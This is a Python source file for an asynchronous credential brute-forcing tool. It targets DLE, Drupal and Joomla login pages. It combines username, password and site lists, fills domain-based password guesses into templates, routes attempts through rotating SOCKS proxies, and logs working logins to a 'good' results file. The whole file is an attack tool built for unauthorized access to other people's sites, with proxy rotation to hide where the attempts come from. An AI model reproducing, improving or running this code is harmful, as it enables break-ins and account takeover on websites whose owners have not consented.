# -*- coding: utf-8 -*-

import asyncio
import contextlib
from re import match
from ssl import SSLError
from urllib.parse import urlsplit

from aiofiles import open as afile
from aiohttp import ClientSession
from aiohttp_socks import SocksConnectionError, SocksConnector, SocksError
from async_timeout import timeout as ftime
from bs4 import BeautifulSoup

from dle import DLE
from drupal import Drupal
from joomla import Joomla


@contextlib.contextmanager
def silent_out():
    loop = asyncio.get_event_loop()
    old_handler = loop.get_exception_handler()
    old_handler_fn = old_handler

    def ignore_exc(_loop, ctx):
        exc = ctx.get('exception')

        if isinstance(exc, SSLError):
            return

        old_handler_fn(loop, ctx)

    loop.set_exception_handler(ignore_exc)

    try:
        yield
    finally:
        loop.set_exception_handler(old_handler)


def macros(p, u, s):
    pattern = r'^(.+?)(?=\.)'
    a = (urlsplit(u).hostname).replace('www.', '')
    a = match(pattern, a)[0]

    p = p.replace('%DOMAIN%', a.upper())
    p = p.replace('%Domain%', a.capitalize())
    p = p.replace(r'%domain%', a.lower())

    if s == '':
        return p

    p = p.replace(r'%username%', s.lower())
    p = p.replace('%Username%', s.capitalize())
    p = p.replace('%USERNAME%', s.upper())

    return p


async def proxy_request():
    async with ClientSession() as s:
        async with s.get(socks_url) as resp:
            return await (resp.text()).split('\n')


async def save(where, what):
    async with afile(f'rez/{where}.txt', 'a',
                     encoding='utf-8', errors='ignore') as f:
        await f.write(str(what) + '\n')


async def first(s, url):
    async with ftime(timeout):
        async with s.get(url, ssl=False) as r:
            return [await r.text(), r.status]


async def second(s, url, data):
    async with ftime(timeout):
        async with s.post(url, data=data, ssl=False) as r:
            return [await r.text(), r.status]


async def process(link, user, passw, proxy):
    global finished, good

    cproxy = SocksConnector.from_url(f'socks{socks_type}://' + proxy)

    try:
        user = macros(user, link, '')
        passw = macros(passw, link, user)

        with silent_out():
            # connector=cproxy
            async with ClientSession() as s:
                data = await first(s, link)

                if not module.valid(data[1], data[0]):
                    await save('rebrut', f'{link} - {user}:{passw}')
                    return

                _post = module.parse(data[0], user, passw)

                if _post is None:
                    await save('rebrut', f'{link} - {user}:{passw}')
                    return

                data = await second(s, link, _post)
                assert module.required in data[0]

                await save('good', f'{link} - {user}:{passw}')
                good += 1
    except (SocksConnectionError, SocksError):
        await save('rebrut', f'{link} - {user}:{passw}')
    except asyncio.TimeoutError:
        await save('timeout', f'{link} - {user}:{passw}')
    except AssertionError:
        pass
    except Exception as e:
        await save('report', e)
    finally:
        finished += 1
        print(f'Good: {good}; Done: {finished}', end='\r')
        return


async def main():
    tasks = []

    proxies = await proxy_request()
    lenofpr = len(proxies) - 10
    curindx = 0

    async with afile("data/users.txt", encoding="utf-8",
                     errors="ignore") as users:
        async for user in users:
            async with afile("data/passw.txt", encoding="utf-8",
                             errors="ignore") as passws:
                async for passw in passws:
                    async with afile("data/sites.txt", encoding="utf-8",
                                     errors="ignore") as sites:
                        async for site in sites:
                            task = asyncio.create_task(
                                process(
                                    site.strip(),
                                    user.strip(),
                                    passw.strip(),
                                    proxies[curindx]
                                )
                            )
                            tasks.append(task)
                            curindx += 1

                            if curindx >= lenofpr:
                                if update:
                                    proxies = await proxy_request()
                                    lenofpr = len(proxies) - 10

                                curindx = 0

                            if len(tasks) >= threads:
                                await asyncio.gather(*tasks)
                                tasks = []

    if len(tasks) != 0:
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    good = 0
    finished = 0

    modules = {
        '0': DLE(),
        '1': Drupal(),
        '2': Joomla()
    }

    threads = 2  # int(input('Threads: '))
    timeout = 30  # int(input('Timeout: '))

    socks_type = input('SOCKS Ver.: ')
    socks_url = input(f'SOCKS{socks_type} Link: ')
    update = bool(int(input('Update proxy: ')))

    module = modules[
        input(
            'Modules:\n' +
            '0 - DLE\n' +
            '1 - Drupal\n' +
            '2 - Joomla\n' +
            'Select: '
        )
    ]

    asyncio.run(main())
